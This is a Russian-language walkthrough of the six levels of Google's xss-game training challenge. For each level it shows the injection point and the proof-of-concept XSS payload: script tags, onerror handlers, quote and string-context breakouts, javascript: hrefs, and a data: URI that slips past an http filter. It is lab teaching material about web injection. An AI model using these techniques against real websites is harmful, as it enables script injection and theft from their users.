# Разбор xss-game от google

- [xss-game](https://xss-game.appspot.com/)

## [1/6]  Level 1: Hello, world of XSS

Видим строку поиска, тыкаем, видим, что улетает GET запрос с параметром ```query```. В ответе говорится, что по моему запросу ничего не найдено. Пробуем скормить спецсимволы, видим, что они встраиваются в DOM.

Тупо скармливаем нагрузку:

```html
<script>alert()</script>
```

## [2/6]  Level 2: Persistence is key

На странице можно оставить комментарий. Пробуем загрузить картинку по несуществующему адресу и вешаем обработчик ошибок:

```html
<img src=qwe onerror=alert()>
```

## [3/6]  Level 3: That sinking feeling...

Итак, видим, что мы можем манипулировать адресом, по которому загружается картинка на страницу. Забавно, что для рендеринга имени картинки парсится ввод, а для формирования адреса нет.

```js
var html = "Image " + parseInt(num) + "<br>";
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```
Посему, наша нагрузка будет выглядить так:
```
1337' onerror=alert() qwe='
```
С помощью кавычки выходим из контекста имени картинки, вешаем обработчик и добавляем еще один параметр, чтобы расширение картинки не ломало контекст. Получился валидный html:

```html
<img src='/static/level3/cloud1337' onerror=alert()  qwe='.jpg' />
```

## [4/6]  Level 4: Context matters

Тут есть форма, которая шлёт GET запрос с параметром ```timer```. Видим, что далее рендерится страница ```timer.html```

Видим, что мы можем манипулировать аргументом функции обработчика:

```
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
```

Наша нагрузка будет выглядить так:

```
1');alert('
```

Опять же, выходим из контекста аргумента функции ```startTimer``` и встраиваем свой код:

```html
<img src="/static/loading.gif" onload="startTimer('1');alert('');" />
```

## [5/6]  Level 5: Breaking protocol

Переходим по ссылке для регистрирации, видим, поле для ввода ```email``` и ссылку ```Next```. Видим, что мы можем манипулировать значением ```href```:

```html
<a href="{{ next }}">Next >></a>
```

Все просто, используем протокол ```javascript``` и исполняем свой код:

```
javascript:alert()
```
## [6/6]  Level 6: Follow the 🐇

Не сложно догадаться, что путь ```/static/gadget.js``` в урле неспроста. На странице говорится, что гаджет загружен из ```/static/gadget.js```. Так же мы видим регулярку, которая не дает нам скормить ссылку с протоколами ```https``` и ```http```:

```js
if (url.match(/^https?:\/\//)) {
  setInnerText(document.getElementById("log"),
  "Sorry, cannot load a URL containing \"http\".");
  return;
}
```

Ок, браузер умеет [встраивать файлы прямо в документ](https://developer.mozilla.org/ru/docs/Web/HTTP/Basics_of_HTTP/Data_URIs), чем мы и воспользуемся:

```
data:text/javascript,alert()
```

Вот и всё :)
